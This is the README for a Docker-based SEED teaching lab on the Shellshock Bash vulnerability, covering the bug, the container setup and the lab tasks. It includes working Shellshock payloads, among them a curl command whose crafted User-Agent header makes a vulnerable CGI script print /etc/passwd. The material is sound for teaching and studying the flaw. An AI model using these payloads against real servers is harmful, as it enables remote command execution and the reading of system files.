# Lab 05 — Shellshock Vulnerability Lab

**Implementation Type**: Official SEED source adapted for Docker

Official lab manual: https://seedsecuritylabs.org/Labs_20.04/Web/Shellshock/
Textbook: Chapter 3 — Shellshock Attack (*Computer & Internet Security*, 2nd Ed., Prof. Wenliang Du)
Lecture Sync Sitemap: [SEED Lecture & Reference Sitemap](../../docs/lectures-and-references.md#6-lab-05--shellshock-vulnerability)
CVE References: [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271), [CVE-2014-7169](https://nvd.nist.gov/vuln/detail/CVE-2014-7169)

For authorized educational use only.

> **HOST BROWSER ROUTING NOTICE**: Access CGI scripts in host clients via `http://localhost:10086/cgi-bin/vul.cgi`. Do not use internal container IP `10.9.0.80` directly in host clients.  
> **CONTAINER COMMAND FALLBACKS**: If `bash` is missing: `docker exec -it shellshock-10.9.0.80 sh`. If `ip` is missing: `hostname -i`. If `ss` is missing: `netstat -tlnp`.

---

## Security Concept

Shellshock is a critical vulnerability in the Bash shell (versions through 4.3) discovered in 2014. Bash allows functions to be stored in environment variables. The bug is that Bash also executes any code appended after the function definition.

```
Normal function in environment variable:
  VAR='() { echo hello; }'

Shellshock payload:
  VAR='() { :; }; echo INJECTED'
           ^^^^^   ^^^^^^^^^^^^^^
           empty   this code runs too
           func    IMMEDIATELY when bash starts
```

When Apache runs a CGI script using Bash, it converts HTTP request headers (User-Agent, Referer, Cookie) into environment variables. An attacker who controls the User-Agent header can inject the Shellshock payload and execute arbitrary commands on the server.

```
Attacker sends:
  User-Agent: () { :; }; /bin/cat /etc/passwd

Apache sets:
  HTTP_USER_AGENT='() { :; }; /bin/cat /etc/passwd'

CGI script runs under vulnerable bash:
  Bash processes the env var -> executes /bin/cat /etc/passwd
  Output sent back to attacker in HTTP response
```

This lab uses:
- `vul.cgi` — runs under `bash_shellshock` (a copy of vulnerable Bash 4.3)
- `safe.cgi` — runs under `/bin/bash` (patched Bash, not vulnerable)

---

## Container Architecture

```
HOST MACHINE
  |
  | Port 10086 -> shellshock-10.9.0.80:80
  |
  Docker Bridge Network: net-10.9.0.0-shellshock (10.9.0.0/24)
    |
    +---- shellshock-10.9.0.80   (Apache 2.4 + CGI scripts + bash_shellshock)
```

---

## Layer 1 — Docker Commands (host terminal)

```bash
cd labs/05-shellshock
.\start.ps1       # Windows PowerShell
./start.sh        # Linux / WSL2 bash
```

---

## Layer 2 — Linux Commands (inside the container)

```bash
docker exec -it shellshock-10.9.0.80 bash
/bin/bash_shellshock -c 'foo="() { :; }; echo VULNERABLE" bash_shellshock -c "echo test"'
cd /usr/lib/cgi-bin
ls -la
exit
```

---

## Layer 3 — Security Tasks

```powershell
# Windows PowerShell RCE payload execution
curl.exe -A "() { :; }; echo Content-Type: text/plain; echo; /bin/cat /etc/passwd" http://localhost:10086/cgi-bin/vul.cgi
```

---

## Stop and Reset

```bash
docker compose down
docker compose down -v
```
